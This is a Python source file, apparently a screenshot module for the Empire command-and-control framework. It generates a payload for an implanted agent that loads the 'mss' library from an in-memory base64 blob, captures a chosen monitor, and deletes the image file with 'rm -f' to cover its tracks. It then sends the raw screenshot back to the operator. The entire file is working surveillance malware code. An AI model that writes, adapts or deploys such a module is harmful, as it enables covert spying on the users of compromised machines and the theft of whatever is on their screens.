import base64
from builtins import object
from typing import Dict, Optional, Tuple

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = "") -> Tuple[Optional[str], Optional[str]]:
        path = main_menu.installPath + "/data/misc/python_modules/mss.zip"
        open_file = open(path, 'rb')
        module_data = open_file.read()
        open_file.close()
        module_data = base64.b64encode(module_data)
        script = """
import os
import base64
data = "%s"
def run(data):
    rawmodule = base64.b64decode(data)
    zf = zipfile.ZipFile(io.BytesIO(rawmodule), "r")
    if "mss" not in moduleRepo.keys():
        moduleRepo["mss"] = zf
        install_hook("mss")
    
    from mss import mss
    m = mss()
    file = m.shot(mon=%s,output='%s')
    raw = open(file, 'rb').read()
    run_command('rm -f %%s' %% (file))
    print(raw)

run(data)
""" % (module_data, params['Monitor'], params['SavePath'])

        return script

